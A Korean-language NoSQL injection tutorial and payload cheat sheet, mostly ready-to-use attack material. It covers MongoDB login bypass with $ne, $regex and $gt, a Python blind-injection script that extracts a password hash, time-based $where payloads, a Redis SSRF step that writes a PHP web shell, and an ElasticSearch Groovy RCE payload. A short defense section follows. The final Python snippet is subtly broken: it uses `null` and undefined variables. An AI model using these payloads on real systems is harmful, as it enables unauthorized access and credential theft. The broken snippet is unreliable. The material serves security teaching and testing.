NoSQL Injection

NoSQL Injection은 MongoDB, Redis, CouchDB 등 NoSQL 데이터베이스를 대상으로 하는 Injection 공격입니다.

개념 (Concept)​

NoSQL Injection이란?​

NoSQL Injection은 NoSQL 데이터베이스의 쿼리 구조를 악용하여:

  • 인증 우회
  • 데이터 추출
  • 권한 상승
  • DoS 공격

을 수행하는 기법입니다.

SQL vs NoSQL​

구분SQLNoSQL
쿼리 언어SQL (표준화)각 DB마다 다름
데이터 구조테이블 (관계형)JSON, Key-Value, Document
Injection' OR 1=1--{"$ne": null}

MongoDB Injection​

기본 개념​

MongoDB는 JSON 기반 Document 데이터베이스입니다.

정상 쿼리 (JavaScript/Node.js):

db.users.find({
    username: "admin",
    password: "password123"
});

Injection 공격:

db.users.find({
    username: {"$ne": null},
    password: {"$ne": null}
});

→ 모든 사용자 반환 (인증 우회)

인증 우회 (Authentication Bypass)​

방법 1: $ne 연산자​

취약한 코드 (Node.js + Express):

app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    db.collection('users').findOne({
        username: username,
        password: password
    }, (err, user) => {
        if (user) {
            res.send("Login successful");
        } else {
            res.send("Login failed");
        }
    });
});

공격 요청 (JSON):

{
    "username": {"$ne": null},
    "password": {"$ne": null}
}

실제 쿼리:

db.collection('users').findOne({
    username: {"$ne": null},
    password: {"$ne": null}
});

→ 첫 번째 사용자 (보통 admin) 로그인 성공

방법 2: $regex 연산자​

공격 요청:

{
    "username": {"$regex": "^admin"},
    "password": {"$regex": ".*"}
}

→ admin으로 시작하는 사용자명과 모든 비밀번호 매칭

방법 3: $gt, $lt 연산자​

공격 요청:

{
    "username": "admin",
    "password": {"$gt": ""}
}

→ 비밀번호가 빈 문자열보다 큰 값 (모든 문자열)

URL 인코딩 방식​

GET 요청:

http://example.com/login?username[$ne]=null&password[$ne]=null

POST 요청 (application/x-www-form-urlencoded):

username[$ne]=null&password[$ne]=null

Blind NoSQL Injection​

Boolean-based​

비밀번호 길이 확인:

{
    "username": "admin",
    "password": {"$regex": "^.{32}$"}
}
  • 성공 응답 → 비밀번호 길이 32자
  • 실패 응답 → 다른 길이

첫 번째 문자 확인:

{
    "username": "admin",
    "password": {"$regex": "^a"}
}
  • 성공 → 첫 문자는 'a'
  • 실패 → 다른 문자

자동화 스크립트 (Python)​

import requests
import string

url = "http://example.com/api/login"
password = ""
charset = string.ascii_letters + string.digits

print("[*] Starting MongoDB Blind Injection...")

for position in range(32):  # MD5 해시는 32자
    for char in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{char}"}
        }

        r = requests.post(url, json=payload)

        if "success" in r.text or "Welcome" in r.text:
            password += char
            print(f"[+] Password: {password}")
            break
    else:
        print(f"[!] Character not found at position {position}")
        break

print(f"\n[+] Final password: {password}")

출력 예시:

[*] Starting MongoDB Blind Injection...
[+] Password: 5
[+] Password: 5f
[+] Password: 5f4
...
[+] Password: 5f4dcc3b5aa765d61d8327deb882cf99

[+] Final password: 5f4dcc3b5aa765d61d8327deb882cf99

MongoDB 연산자 악용​

$where 연산자 (JavaScript 실행)​

매우 위험: JavaScript 코드를 직접 실행

취약한 코드:

db.users.find({
    $where: `this.username == '${username}' && this.password == '${password}'`
});

공격 페이로드:

{
    "username": "admin",
    "password": "' || '1'=='1"
}

실행되는 JavaScript:

this.username == 'admin' && this.password == '' || '1'=='1'

→ 항상 참 (모든 문서 반환)

$where를 이용한 Time-based Blind​

공격 페이로드:

{
    "username": "admin",
    "password": {
        "$where": "sleep(5000) || true"
    }
}

→ 5초 지연 (Blind Injection 확인)

조건부 Time-based:

{
    "username": "admin",
    "password": {
        "$where": "if (this.password[0] == 'a') { sleep(5000); } return true;"
    }
}

데이터 추출​

$in 연산자​

사용자 목록 추출:

{
    "username": {"$in": ["admin", "root", "user1", "user2"]},
    "password": {"$ne": null}
}

$nin 연산자 (Not In)​

{
    "username": {"$nin": ["admin"]},
    "password": {"$ne": null}
}

→ admin을 제외한 모든 사용자

Redis Injection​

Redis 기본 개념​

Redis는 Key-Value 저장소입니다.

정상 명령:

GET user:admin:password
SET user:hacker:password "hacked123"

SSRF를 통한 Redis 공격​

시나리오: SSRF 취약점 + Redis (기본 포트 6379)

공격 요청:

http://example.com/fetch?url=http://localhost:6379/
POST_DATA=SET%20shell%20"<?php%20system($_GET['cmd']);%20?>"

Redis 명령 실행:

SET shell "<?php system($_GET['cmd']); ?>"
SAVE

→ /var/lib/redis/dump.rdb에 웹셸 저장

Lua Script Injection​

Redis는 Lua 스크립트 실행 가능:

EVAL "return redis.call('GET', KEYS[1])" 1 user:admin:password

Injection 공격:

EVAL "return redis.call('SET', 'shell', '<?php system($_GET[\"cmd\"]); ?>')" 0

CouchDB Injection​

CouchDB 기본 개념​

CouchDB는 HTTP REST API를 사용하는 Document 데이터베이스입니다.

정상 쿼리:

GET http://localhost:5984/users/_all_docs

인증 우회​

취약한 설정: _security 문서 미설정

공격:

GET http://example.com:5984/_users/_all_docs?include_docs=true HTTP/1.1

응답:

{
  "rows": [
    {
      "id": "org.couchdb.user:admin",
      "key": "admin",
      "value": {"rev": "1-xxx"},
      "doc": {
        "name": "admin",
        "password_sha": "5f4dcc3b5aa765d61d8327deb882cf99",
        "roles": ["_admin"]
      }
    }
  ]
}

→ 관리자 비밀번호 해시 노출

Mango Query Injection​

CouchDB Mango: SQL-like 쿼리

정상 쿼리:

{
  "selector": {
    "username": "admin",
    "password": "password123"
  }
}

Injection:

{
  "selector": {
    "username": "admin",
    "password": {"$ne": null}
  }
}

→ 인증 우회

Cassandra Injection​

CQL (Cassandra Query Language)​

CQL은 SQL과 유사하지만 제한적:

정상 쿼리:

SELECT * FROM users WHERE username='admin' AND password='password123'

Injection 시도:

SELECT * FROM users WHERE username='admin' OR 1=1--' AND password='anything'

→ 대부분 실패 (Prepared Statements 기본 사용)

ElasticSearch Injection​

ElasticSearch Query DSL​

정상 쿼리:

{
  "query": {
    "match": {
      "username": "admin"
    }
  }
}

Injection:

{
  "query": {
    "match_all": {}
  }
}

→ 모든 문서 반환

Script Query 악용​

Groovy 스크립트 실행 (구버전):

{
  "query": {
    "script": {
      "script": "java.lang.Runtime.getRuntime().exec('calc.exe')"
    }
  }
}

→ RCE (원격 코드 실행)

최신 버전: Groovy 스크립트 비활성화됨

실전 공격 시나리오​

시나리오: MongoDB 인증 우회 + 비밀번호 추출​

대상: Node.js + MongoDB API

Phase 1: 인증 우회

1. 정상 로그인 시도:

POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "username": "admin",
    "password": "wrongpassword"
}

응답:

{"error": "Invalid credentials"}

2. NoSQL Injection 시도:

POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "username": {"$ne": null},
    "password": {"$ne": null}
}

응답:

{
    "success": true,
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {
        "username": "admin",
        "role": "admin"
    }
}

→ 관리자 권한 획득

Phase 2: 비밀번호 추출

3. Blind Injection 스크립트:

import requests
import string

url = "http://example.com/api/login"
password = ""
charset = string.hexdigits.lower()

for i in range(32):  # MD5 32자
    for c in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}"}
        }

        r = requests.post(url, json=payload)

        if r.status_code == 200 and "success" in r.text:
            password += c
            print(f"[+] {password}")
            break

print(f"\n[+] Password: {password}")

4. 해시 크랙:

echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=Raw-MD5 --wordlist=rockyou.txt hash.txt

결과: password

방어 기법​

1. Input Validation​

취약한 코드:

const username = req.body.username;
const password = req.body.password;

안전한 코드:

const username = req.body.username;
const password = req.body.password;

// 타입 검증
if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({error: "Invalid input"});
}

// 객체 거부
if (typeof username === 'object' || typeof password === 'object') {
    return res.status(400).json({error: "Objects not allowed"});
}

2. Schema Validation (Mongoose)​

const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

// 쿼리 시 타입 강제
User.findOne({
    username: String(req.body.username),
    password: String(req.body.password)
});

3. Sanitization​

const mongoSanitize = require('express-mongo-sanitize');

app.use(mongoSanitize({
    replaceWith: '_'  // $, . 문자를 _로 치환
}));

4. 최소 권한 원칙​

MongoDB 사용자 권한 제한:

db.createUser({
    user: "webapp",
    pwd: "password",
    roles: [
        { role: "read", db: "mydb" },
        { role: "readWrite", db: "mydb" }
    ]
});

→ $where 실행 권한 없음

5. Rate Limiting​

const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15분
    max: 5,  // 최대 5번 시도
    message: "Too many login attempts"
});

app.post('/login', loginLimiter, (req, res) => {
    // 로그인 로직
});

트러블슈팅 체크리스트​

NoSQL Injection이 안 될 때​

  • 요청 Content-Type 확인 (application/json)
  • 백엔드가 Mongoose 등 ORM 사용하는지 확인
  • Input validation이 있는지 확인
  • 다른 연산자 시도 ($gt, $regex, $where)

Blind Injection이 느릴 때​

  • 문자셋 최소화 (hex만 사용)
  • 병렬 요청 (멀티스레딩)
  • Time-based 대신 Boolean-based 사용

자동화 도구 실패 시​

  • 수동으로 페이로드 확인
  • Burp Suite로 요청/응답 분석
  • 커스텀 스크립트 작성

MongoDB Injection​

# 인증 우회
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}

# Blind Injection
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^.{32}$"}}

# $where 악용
{"$where": "sleep(5000) || true"}
{"$where": "this.password[0] == 'a'"}

# 데이터 추출
{"username": {"$in": ["admin", "root"]}}

URL 인코딩​

username[$ne]=null&password[$ne]=null
username[$regex]=^admin&password[$gt]=

NoSQLMap​

python3 nosqlmap.py -u http://example.com/login -p username,password --attack 2 --victim admin

Python 자동화​

import requests

# 인증 우회
payload = {"username": {"$ne": null}, "password": {"$ne": null}}
r = requests.post("http://example.com/api/login", json=payload)

# Blind Injection
for c in "abcdefghijklmnopqrstuvwxyz0123456789":
    payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
    r = requests.post(url, json=payload)
    if "success" in r.text:
        password += c
